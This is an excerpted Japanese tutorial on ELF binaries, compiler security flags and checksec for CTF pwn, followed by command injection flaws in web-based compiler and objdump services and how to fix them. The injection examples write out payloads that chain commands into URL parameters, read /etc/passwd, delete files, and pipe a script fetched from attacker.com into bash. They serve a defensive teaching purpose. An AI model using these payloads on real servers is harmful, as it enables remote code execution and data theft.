...
「CTF の Pwn でまず何を確認すべきか？」

この問いに即答できないなら、この記事が助けになる。答えはシンプルだ——**`checksec` でバイナリの保護状態を確認し、PIE・RELRO・NX・Canary の有無から攻撃経路を絞る**。コンパイルとリンクの仕組みを知れば、なぜその保護が効くのか・どこを突けば崩せるのかが根本から理解できる。
...
左から右へ「人間が読める → 展開済み → アセンブリ → 機械語（未結合） → 実行ファイル」と段階的に変換されていく。各段階が独立しているため、途中で止めて中間ファイルを確認できるのが重要なポイントだ。

**計算量まとめ**

各ステップの役割と対応する GCC オプションを整理する。
...
**コンパイルパイプラインの弱点 — 各段階の設定ミス**

4 段階のどこかでセキュリティオプションが抜けると、最終バイナリに保護が反映されない。「コンパイルは通った」と「安全なバイナリが生成された」は別の話だ。
...
ELF が「目的別のセクション」に分割されているのがポイントだ。この分割があるからこそ OS が「ここは実行可能、ここは読み取り専用」と細かくメモリ保護を設定できる。逆にこの構造を攻撃者が読めば、書き換え可能な箇所（GOT など）を正確に狙える。
...
**ELF 構造の弱点 — GOT の書き換え可能性**

Partial RELRO の状態では `.got` は実行時に書き込み可能なまま残る。バッファオーバーフローなどで `.got` の内容を書き換えられると、次回の関数呼び出しが攻撃者の指定したアドレスへリダイレクトされる。Full RELRO はこれを防ぐ。
...
各保護は独立して動作し、複数を重ねることで突破の難易度が上がる。図のフロー上で「どの保護が最初に壁になるか」が攻撃経路の分析そのものだ。
...
**セキュリティオプションの弱点 — 重ね合わせが前提**

各保護は単独では突破される可能性がある。CVE-2021-3156 は PIE・RELRO・NX が有効でもヒープ BOF テクニックで突破された事例だ。「保護を有効にした」と「突破不可能」は別の話であり、縦深防御（Defense in Depth）の考え方が重要だ。
...
**「PIE を有効にするだけで ASLR が効く」**
PIE は「実行ファイルを任意アドレスに配置できる形式」で、ASLR は「OS が実際にランダムなアドレスを選ぶ機能」だ。**両方が必要**で、OS の ASLR が無効（`/proc/sys/kernel/randomize_va_space` が `0`）なら PIE を有効にしても毎回同じアドレスになる。

**「`-fstack-protector` と `-fstack-protector-all` は同じ」**
...
**どこが問題か**: `$filename` をサニタイズせずにシェルコマンドに直接結合している。`?file=report.pdf;cat /etc/passwd` のように `;` を挟むだけで `/etc/passwd` の内容が出力され、さらに `|bash` や `&& curl attacker.com/shell.sh | bash` のようなペイロードでリモートコード実行まで到達できる。**攻撃者はブラウザの URL 欄を書き換えるだけでサーバー上で任意コマンドを実行できる**。
...
**「ホワイトリストで先に弾き、その後 `escapeshellarg()` で二重にエスケープする」——この 2 層防御がコマンドインジェクションへの基本的な対策だ。**
...
**どこが問題か**: `?src=; rm -rf /tmp/` のようなペイロードで任意コマンドが実行される。`gcc` を呼び出す正規の処理に見えても、`src` の値をそのまま文字列結合しているためシェルが `;` 以降を別コマンドとして解釈する。**コンパイラを Web 経由で提供するサービスでこのパターンは頻出であり、サーバー全体の乗っ取りにつながる**。
...
また `execFile` に `-fstack-protector-strong -pie -fPIE -Wl,-z,relro -Wl,-z,now` を渡すことで、コンパイル結果にもセキュリティ強化オプションが適用される。**`execFile` にリスト形式で引数を渡す「シェル非経由実行」が、コマンドインジェクション全般への根本的な対策だ。**
...
**どこが問題か**: `?binary=/tmp/a.out;id` で `id` コマンドが実行される。`objdump` のようなバイナリ解析ツールを Web 経由で提供する CTF プラットフォームの設計ミスでよく見られるパターンだ。`shell=True` は「シェルを挟む」という宣言であり、ユーザー入力を含む文字列に使った時点でインジェクションのリスクが生まれる。**`id` だけでなく `curl attacker.com/shell | bash` のようなリバースシェルも同様に実行できる**。
...
**`shell=True` を外してリスト形式に変えるだけで、シェルを経由しなくなりメタ文字が無効化される。加えてホワイトリストと `timeout` を組み合わせることで 3 層の防御になる。**
